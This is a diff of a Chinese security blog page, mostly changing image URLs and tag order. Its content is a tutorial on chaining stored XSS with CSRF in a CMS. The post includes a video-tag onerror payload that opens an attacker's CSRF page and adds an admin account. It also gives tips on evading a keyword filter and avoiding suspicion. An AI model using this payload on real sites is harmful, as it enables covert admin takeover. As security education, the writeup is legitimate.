@@ -15,25 +15,25 @@
 <meta property="og:url" content="http://yoursite.com/2018/11/01/xsrf/index.html">
 <meta property="og:site_name" content="WhiteRabbit的博客">
 <meta property="og:description" content="这篇博文来自之前挖掘一套CMS漏洞时，同时挖出了xss和csrf漏洞。不过我提交漏洞后，xss漏洞被接受了，而csrf漏洞被退回了，理由是：利用难度太大，不予收录。可以想象当时我的心情是十分不爽的，所以我绞尽脑汁，将xss和csrf配合使用，向某机构证明是可以利用的，而且很方便。最后漏洞被收录吗？嘿嘿，你们自己猜吧，不过这次经历说明了当xss配合csrf打出组合拳时，会有意想不到的效果。">
-<meta property="og:image" content="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xss-1.png">
-<meta property="og:image" content="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xss-2.png">
-<meta property="og:image" content="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xss-3.png">
-<meta property="og:image" content="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xss-4.png">
-<meta property="og:image" content="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xss-6.png">
-<meta property="og:image" content="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xss-7.png">
-<meta property="og:image" content="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/csrf-2.png">
-<meta property="og:image" content="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/csrf-3.png">
-<meta property="og:image" content="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/csrf-4.png">
-<meta property="og:image" content="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xsrf-1.png">
-<meta property="og:image" content="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xsrf-2.png">
-<meta property="og:image" content="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xsrf-3.png">
-<meta property="og:image" content="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xsrf-4.png">
-<meta property="og:image" content="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xsrf-5.png">
-<meta property="og:updated_time" content="2018-11-12T07:57:58.140Z">
+<meta property="og:image" content="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xss-1.png">
+<meta property="og:image" content="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xss-2.png">
+<meta property="og:image" content="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xss-3.png">
+<meta property="og:image" content="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xss-4.png">
+<meta property="og:image" content="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xss-6.png">
+<meta property="og:image" content="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xss-7.png">
+<meta property="og:image" content="http://picture.whiterabbitxyj.com/blogPicture/xsrf/csrf-2.png">
+<meta property="og:image" content="http://picture.whiterabbitxyj.com/blogPicture/xsrf/csrf-3.png">
+<meta property="og:image" content="http://picture.whiterabbitxyj.com/blogPicture/xsrf/csrf-4.png">
+<meta property="og:image" content="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xsrf-1.png">
+<meta property="og:image" content="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xsrf-2.png">
+<meta property="og:image" content="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xsrf-3.png">
+<meta property="og:image" content="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xsrf-4.png">
+<meta property="og:image" content="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xsrf-5.png">
+<meta property="og:updated_time" content="2018-12-13T12:40:25.380Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="当xss邂逅csrf：中招只在一瞬间">
 <meta name="twitter:description" content="这篇博文来自之前挖掘一套CMS漏洞时，同时挖出了xss和csrf漏洞。不过我提交漏洞后，xss漏洞被接受了，而csrf漏洞被退回了，理由是：利用难度太大，不予收录。可以想象当时我的心情是十分不爽的，所以我绞尽脑汁，将xss和csrf配合使用，向某机构证明是可以利用的，而且很方便。最后漏洞被收录吗？嘿嘿，你们自己猜吧，不过这次经历说明了当xss配合csrf打出组合拳时，会有意想不到的效果。">
-<meta name="twitter:image" content="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xss-1.png">
+<meta name="twitter:image" content="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xss-1.png">
   
     <link rel="alternative" href="/atom.xml" title="WhiteRabbit的博客" type="application/atom+xml">
   
@@ -223,29 +223,29 @@
 <a id="more"></a>
 <hr>
 <h1 id="寻找XSS漏洞"><a href="#寻找XSS漏洞" class="headerlink" title="寻找XSS漏洞"></a>寻找XSS漏洞</h1><p>拿到CMS，第一件事先去看它有没有留言功能，因为留言功能一般是会传到后台给管理员看的，所以如果有留言功能就可能存在XSS漏洞。我很快找到这套CMS的留言框，迫不及待地打了一个XSS尝试：</p>
-<p><img src="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xss-1.png" alt="xsrf-1"> </p>
-<p><img src="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xss-2.png" alt="xsrf-2"></p>
+<p><img src="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xss-1.png" alt="xsrf-1"> </p>
+<p><img src="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xss-2.png" alt="xsrf-2"></p>
 <p>请求直接被拦截了，很明显是有过滤机制的，去查看了一下他们的防护措施：</p>
-<p><img src="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xss-3.png" alt="xsrf-3"></p>
+<p><img src="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xss-3.png" alt="xsrf-3"></p>
 <p>在上面我用红框标注的是针对xss的过滤，正则匹配关键字：script，img，还有几个弹框函数。这里我想说一下，一些小白挖xss的洞，script一下失败，然后换成img一下也失败，然后就放弃了。其实可以插xss的标签远不止这两个，比如我用video标签来绕过这次xss过滤：</p>
-<p><img src="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xss-4.png" alt="xsrf-4"></p>
+<p><img src="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xss-4.png" alt="xsrf-4"></p>
 <p>当管理员在后台查看留言时，就会触发xss代码，cookie被传到我的xss平台上：</p>
-<p><img src="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xss-6.png" alt="xsrf-6"></p>
-<p><img src="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xss-7.png" alt="xsrf-7"></p>
+<p><img src="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xss-6.png" alt="xsrf-6"></p>
+<p><img src="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xss-7.png" alt="xsrf-7"></p>
 <h1 id="寻找CSRF漏洞"><a href="#寻找CSRF漏洞" class="headerlink" title="寻找CSRF漏洞"></a>寻找CSRF漏洞</h1><p>CSRF漏洞一般是由于没有检查Referer以及未在头部设置token造成的。<br>CSRF的漏洞的寻找相对简单，我截获了请求包，发现没有token来对csrf攻击进行防护，于是尝试删除csrf中的Referer字段，发现并不影响功能，比如增加管理员。所以判断这套CMS是存在csrf漏洞的，于是在另一台服务器上构造了利用代码：</p>
-<p><img src="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/csrf-2.png" alt="xsrf-8"></p>
+<p><img src="http://picture.whiterabbitxyj.com/blogPicture/xsrf/csrf-2.png" alt="xsrf-8"></p>
 <p>当管理员访问我服务器上的网页时，他就会中招：看到一个空白页面，但是本地网站后台增加了一个管理员。</p>
-<p><img src="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/csrf-3.png" alt="xsrf-9"></p>
-<p><img src="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/csrf-4.png" alt="xsrf-10"></p>
+<p><img src="http://picture.whiterabbitxyj.com/blogPicture/xsrf/csrf-3.png" alt="xsrf-9"></p>
+<p><img src="http://picture.whiterabbitxyj.com/blogPicture/xsrf/csrf-4.png" alt="xsrf-10"></p>
 <h2 id="XSS配合CSRF打出组合拳"><a href="#XSS配合CSRF打出组合拳" class="headerlink" title="XSS配合CSRF打出组合拳"></a>XSS配合CSRF打出组合拳</h2><p>我们思考一个问题，存储型xss可以打到管理员的cookie，但是如果cookie保存时间很短，我们用的时候已经失效了，那也就没什么用了。再考虑一下csrf，实现csrf攻击有一个大前提，就是让管理员去访问你的服务器。<br>一般来说，我们需要诱导管理员去访问你服务器上构造的csrf代码，比如留言诱导，客服诱导等等。但如果管理员就是不点击你的链接，不去访问你的服csrf代码，那你真是一点办法的没有。这也是为什么人家漏洞机构不收csrf漏洞的主要原因。<br>我们思考为什么存储型xss漏洞的成功率比csrf高，因为xss代码是存储在数据库中，每次都会在后台自动调取，所以管理员一查看后台就中招了。查看自己网站的留言和访问外部服务器，很明显管理员更容易选择相信前者，所以相对而言存储型xss攻击的成功率更高。</p>
 <p>接下来，我们将挖到的xss漏洞和csrf配合使用，吸取他们的优点，打出组合拳。首先，我们在留言处构造xss代码：</p>
 <pre><code>&lt;video src=&quot;x&quot; onerror=javascript:window.open(&quot;http://localhost:8000/csrf.html&quot;)&gt;&lt;/video&gt;
 </code></pre><p>这段js代码执行后，会直接在浏览器中打开一个新的窗口，且去访问我们制定的外部服务器上的csrf代码。</p>
-<p><img src="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xsrf-1.png" alt="xsrf-11"><br><img src="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xsrf-2.png" alt="xsrf-12"></p>
+<p><img src="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xsrf-1.png" alt="xsrf-11"><br><img src="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xsrf-2.png" alt="xsrf-12"></p>
 <p>当管理员查看留言时，直接触发js代码，弹出一个新的窗口：</p>
-<p><img src="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xsrf-3.png" alt="xsrf-13"><br><img src="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xsrf-4.png" alt="xsrf-14"></p>
+<p><img src="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xsrf-3.png" alt="xsrf-13"><br><img src="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xsrf-4.png" alt="xsrf-14"></p>
 <p>管理员可能会觉得莫名其妙，并关闭这个窗口，然而他并不知道我们已经借用他的权限执行了csrf代码，在他的后台增加了一个管理员账户：</p>
-<p><img src="http://oz1sa62oq.bkt.clouddn.com/image/xsrf/xsrf-5.png" alt="xsrf-15"></p>
+<p><img src="http://picture.whiterabbitxyj.com/blogPicture/xsrf/xsrf-5.png" alt="xsrf-15"></p>
 <p>当然，更好做的做法是构造js代码让这个新打开的窗口完成工作后自动关闭，这样管理员起疑心的可能性还会降低。</p>
 <p>这样一来，我们成功利用xss+csrf在网站后台增加了一个管理员，弥补了xss攻击中cookie失效的问题，也弥补了csrf利用难度大的问题（难度相当于xss）。</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这两个漏洞相对还是比较简单的，所以我拿出来作为讲解xss和csrf组合利用的案例，希望各位小白能从中学到知识。</p>
@@ -547,14 +547,6 @@ getOwnMetadataKeys:function(t){return o(i(t),arguments.length<2?void 0:u(argumen
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">渗透</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">WAF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">安全</a>
               </li>
              
@@ -575,11 +567,11 @@ getOwnMetadataKeys:function(t){return o(i(t),arguments.length<2?void 0:u(argumen
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
+                <a href="javascript:void(0)" class="js-tag color3">渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+                <a href="javascript:void(0)" class="js-tag color4">WAF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -595,6 +587,14 @@ getOwnMetadataKeys:function(t){return o(i(t),arguments.length<2?void 0:u(argumen
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">pandas</a>
               </li>
              
@@ -604,10 +604,6 @@ getOwnMetadataKeys:function(t){return o(i(t),arguments.length<2?void 0:u(argumen
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">python</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">博客</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -623,14 +619,6 @@ getOwnMetadataKeys:function(t){return o(i(t),arguments.length<2?void 0:u(argumen
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">搜索</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">https</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">私有云</a>
               </li>
              
@@ -639,11 +627,27 @@ getOwnMetadataKeys:function(t){return o(i(t),arguments.length<2?void 0:u(argumen
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">xss</a>
+                <a href="javascript:void(0)" class="js-tag color3">博客</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">csrf</a>
+                <a href="javascript:void(0)" class="js-tag color3">搜索</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">https</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">scrapy</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">爬虫</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">xss</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -659,11 +663,7 @@ getOwnMetadataKeys:function(t){return o(i(t),arguments.length<2?void 0:u(argumen
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">scrapy</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">爬虫</a>
+                <a href="javascript:void(0)" class="js-tag color5">csrf</a>
               </li>
             
             <div class="clearfix"></div>
